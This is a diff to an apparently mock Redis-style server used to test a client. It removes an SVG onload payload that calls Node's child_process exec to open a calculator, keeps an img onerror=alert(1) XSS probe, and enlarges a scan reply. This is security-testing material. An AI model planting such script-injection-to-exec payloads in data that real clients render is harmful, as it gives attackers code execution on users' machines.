@@ -72,15 +72,7 @@ def create_array_response(items):
 
 
 def get_mock_info_test():
-    os_data = '<svg/onload="(function(){\n\
-  const { exec } = require(\'child_process\');\n\
-  const cmd = process.platform === \'win32\' \n\
-    ? \'calc.exe\' \n\
-    : process.platform === \'darwin\' \n\
-      ? \'open -a Calculator\' \n\
-      : \'xcalc\';\n\
-  exec(cmd);\n\
-})()">'
+    os_data = '">111222'
     test = '<img src=x onerror=alert(1) />'
     base_lines = [
             "# Server",
@@ -176,7 +168,7 @@ def handle_command(command):
     if cmd == 'scan' and len(command) >= 2:
         cursor = command[1]
         if cursor == '0':
-            return create_array_response(["79", ['a' * 1500]])
+            return create_array_response(["79", ['a' * 15000]])
         elif cursor == '79':
             return create_array_response(["0", []])
         else:
